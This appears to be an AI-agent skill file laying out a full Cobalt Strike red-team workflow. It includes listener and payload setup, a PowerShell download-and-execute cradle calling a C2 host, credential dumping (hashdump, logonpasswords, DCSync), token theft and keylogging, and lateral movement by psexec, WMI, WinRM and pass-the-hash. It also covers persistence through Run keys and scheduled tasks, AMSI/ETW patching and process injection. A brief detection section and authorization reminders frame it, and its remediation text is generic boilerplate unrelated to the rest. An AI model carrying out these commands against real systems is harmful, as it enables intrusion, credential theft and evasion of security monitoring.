---
name: cobalt-strike-beacon-operations
description: >
  Operate Cobalt Strike for red team engagements including Beacon deployment, C2 communication,
  post-exploitation, lateral movement, and evasion. Use this skill when conducting authorized red
  team operations that require a commercial C2 framework. Covers malleable C2 profiles, staged/stageless
  payloads, sleep and jitter configuration, SOCKS proxying, and advanced BOF (Beacon Object Files)
  usage for opsec-safe operations.
domain: cybersecurity
subdomain: red-teaming
category: C2 Frameworks
difficulty: expert
estimated_time: "8-24 hours"
mitre_attack:
  tactics: [TA0011, TA0008, TA0005]
  techniques: [T1071.001, T1059.003, T1055]
platforms: [linux, windows]
tags: [cobalt-strike, beacon, c2-framework, red-team, post-exploitation, lateral-movement, evasion, malleable-c2]
tools: [cobalt-strike, aggressor-scripts, bof, situational-awareness]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Cobalt Strike Beacon Operations

## When to Use
- During authorized red team engagements requiring professional C2 operations
- When conducting assumed-breach assessments with persistent access requirements
- When simulating advanced persistent threat (APT) operations
- When testing EDR/AV detection and security monitoring capabilities
- When you need advanced post-exploitation with opsec considerations

**When NOT to use**: For open-source alternatives, use `sliver-c2-implant-operations` or `havoc-c2-demon-operations` skills. NEVER use without explicit written authorization.

## Prerequisites
- Licensed Cobalt Strike (valid license required)
- Red team infrastructure: redirectors, domains, SSL certificates
- Malleable C2 profile (don't use default!)
- Understanding of OPSEC principles
- Written authorization (Rules of Engagement document)
- Kill chain plan agreed with engagement stakeholders

## Workflow

### Phase 1: Infrastructure Setup

```bash
# Start Team Server (on Red Team server)
./teamserver <TEAM_SERVER_IP> <PASSWORD> <MALLEABLE_PROFILE>

# Example with custom profile:
./teamserver 10.10.10.100 RedTeam2024! ./profiles/amazon.profile

# Connect Cobalt Strike client
# File → New Connection
# Host: 10.10.10.100
# Port: 50050
# Password: RedTeam2024!

# Configure Listeners:
# Attacks → Web Drive-by → Scripted Web Delivery (for quick staging)
# Cobalt Strike → Listeners → Add
# Types: HTTP, HTTPS, DNS, SMB (named pipe), TCP

# HTTPS Listener (recommended):
# Name: https-c2
# HTTP Host: c2.attacker-domain.com
# HTTP Port: 443
# HTTPS Certificate: Let's Encrypt cert for your domain
# Profile: Use malleable C2 profile that mimics legitimate traffic
```

### Phase 2: Payload Generation & Delivery

```bash
# Generate payloads:
# Attacks → Packages →

# Staged payload (small, needs callback to download full beacon):
# Windows Executable (exe, dll, svc)
# HTML Application (hta)

# Stageless payload (full beacon, no callback needed):
# Windows Executable (Stageless) — preferred for opsec
# Raw shellcode — use with custom loaders

# Payload best practices:
# - Use stageless over staged (less network artifacts)
# - Generate raw shellcode and use custom loader
# - Sign payloads with valid code signing certificate
# - Use process injection instead of on-disk execution
# - Obfuscate shellcode to evade static signatures

# Scripted Web Delivery:
# Attacks → Web Drive-by → Scripted Web Delivery
# Generates: powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/a')"

# Custom shellcode loader (example concept):
# 1. Generate raw shellcode: Payloads → Stager → Raw
# 2. Encrypt with AES-256
# 3. Embed in custom C# loader
# 4. Add sandbox evasion checks
# 5. Use syscalls for injection to bypass EDR hooks
```

### Phase 3: Initial Beacon Operations

```bash
# Once beacon checks in, verify access:
# Right-click beacon → Interact

# Basic situational awareness:
shell whoami /all          # Current user and groups
shell hostname             # Machine name
shell ipconfig /all        # Network configuration
shell net user             # Local users
shell net group "Domain Admins" /domain   # Domain admins
shell systeminfo           # OS details and patches

# OPSEC-safe alternatives (BOFs — no process creation):
bof-reg-query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion ProductName
inline-execute situational-awareness.o

# Process listing (check for security tools):
ps
# Look for: MsMpEng.exe (Defender), CrowdStrike, SentinelOne,
# Carbon Black, Cylance, Cortex XDR agents

# Configure Beacon for stealth:
sleep 60 30                # 60 second sleep, 30% jitter
# Production: sleep 300-900 with 30-50% jitter
# Engagement: adjust based on detection risk

# Set up SOCKS proxy for pivoting:
socks 1080
# Configure proxychains with: socks5 127.0.0.1 1080
```

### Phase 4: Post-Exploitation

```bash
# Credential harvesting:
hashdump                   # Local SAM hashes
logonpasswords             # Mimikatz sekurlsa::logonpasswords
dcsync domain.local DOMAIN\krbtgt   # DCSync (requires DA privs)

# Token manipulation:
steal_token <PID>          # Steal token from another process
make_token DOMAIN\user Password    # Create token with known creds
rev2self                   # Revert to original token

# Kerberos:
kerberos_ticket_use <ticket.kirbi>
kerberos_ticket_purge

# File operations:
download C:\Users\admin\Desktop\secrets.txt
upload /tmp/tool.exe C:\Windows\Temp\tool.exe

# Screenshot and keylogging:
screenshot
keylogger <PID>

# Port scanning (through beacon):
portscan 10.10.10.0/24 22,80,443,445,3389 none 1024

# Network pivoting:
socks 1080                 # Start SOCKS proxy
rportfwd 8080 10.10.10.50 80  # Reverse port forward
```

### Phase 5: Lateral Movement

```bash
# PSExec (creates service — noisy):
jump psexec target.domain.local https-c2
jump psexec64 target.domain.local https-c2

# WMI (no service creation — quieter):
remote-exec wmi target.domain.local <command>
jump psexec_psh target.domain.local https-c2

# WinRM:
jump winrm target.domain.local https-c2
jump winrm64 target.domain.local https-c2

# DCOM:
# Use with spawn or shinject for beacon deployment

# Pass-the-Hash:
pth DOMAIN\admin <NTLM_HASH>
# Then use spawned token for lateral movement

# Named Pipe pivoting (for internal networks):
# Create SMB listener
# Deploy beacon using jump command
# Beacon communicates through named pipes (harder to detect)

# SSH (Linux targets):
ssh user@linux-target password
ssh-key user@linux-target /path/to/key
```

### Phase 6: Persistence & Evasion

```bash
# Registry persistence:
run reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\path\beacon.exe"

# Scheduled task:
shell schtasks /create /tn "WindowsUpdate" /tr "C:\path\beacon.exe" /sc daily /st 09:00

# Service creation (requires admin):
# Use custom service executable

# DLL hijacking:
# Place malicious DLL in application directory

# COM object hijacking:
# Register custom COM object for persistence

# AMSI bypass (before PowerShell operations):
# Use BOF-based AMSI bypass
# Or patch amsi.dll in memory

# ETW patching (disable logging):
# Patch EtwEventWrite to prevent telemetry

# Process injection techniques:
inject <PID> x64 https-c2    # Inject beacon into process
shinject <PID> x64 /path/to/shellcode  # Inject raw shellcode
dllinject <PID> /path/to/dll   # DLL inject

# Choose injection targets wisely:
# - Long-running processes (svchost.exe, explorer.exe)
# - Processes matching your payload arch (x64 → x64)
# - Avoid security product processes
```

## 🔵 Blue Team Detection
- **Named pipe detection**: Monitor for unusual named pipes (default: `\\.\pipe\msagent_*`)
- **Network signatures**: CS default malleable profiles have known JA3/JA3S hashes
- **Process creation**: Alert on service installation via PsExec, unusual scheduled tasks
- **Memory scanning**: YARA rules for Cobalt Strike beacon shellcode signatures
- **DNS beaconing**: Detect regular DNS queries to uncommon domains with consistent timing
- **Sigma rules**: Detect CS-specific behaviors (sleep patterns, parent-child process anomalies)

## Key Concepts
| Concept | Description |
|---------|-------------|
| Beacon | Cobalt Strike's implant/agent that runs on target systems |
| Malleable C2 | Profile that customizes beacon's network communication to mimic legitimate traffic |
| BOF | Beacon Object File — small compiled code that runs inside beacon process (no process spawn) |
| Sleep/Jitter | Beacon callback interval and randomization to evade pattern detection |
| Staged vs Stageless | Staged downloads full beacon after initial callback; stageless contains everything |
| Aggressor Script | Cobalt Strike's scripting language for automation and customization |

## Output Format
```
Red Team C2 Operations Report
==============================
Engagement: CORP-RT-2024-Q1
C2 Framework: Cobalt Strike 4.9
Duration: 14 days
Infrastructure: 3 redirectors, 2 team servers, HTTPS + DNS channels

Beacons Deployed: 23 (across 18 unique hosts)
Domain Admin Achieved: Day 3 (via Kerberoasting + credential reuse)
Lateral Movement: 18 hosts compromised
Data Exfiltrated: 2.3 GB (simulated sensitive documents)
Detection Events: 2 (both false positives from security team)

Kill Chain Summary:
1. Initial Access: Spearphishing → Beacon on WORKSTATION-15
2. Discovery: BloodHound revealed Kerberoastable svc_backup
3. Credential Access: Kerberoasted svc_backup (cracked: Backup2024!)
4. Lateral Movement: svc_backup → local admin on SQLSERVER01
5. Privilege Escalation: Extracted DA creds from SQLSERVER01 memory
6. Domain Dominance: DCSync → full NTDS.dit → Golden Ticket
7. Data Access: Accessed file shares, email, and databases

OPSEC Metrics:
- Average beacon sleep: 300s with 40% jitter
- Zero on-disk indicators
- All lateral movement via WMI (no PsExec services)
- Custom malleable profile mimicking Microsoft Teams traffic
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Cobalt Strike: [Official Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/)
- MITRE ATT&CK: [Software — Cobalt Strike](https://attack.mitre.org/software/S0154/)
- Red Team Ops: [Malleable C2 Profiles](https://github.com/threatexpress/malleable-c2)
- Awesome CobaltStrike: [Community Resources](https://github.com/zer0yu/Awesome-CobaltStrike)
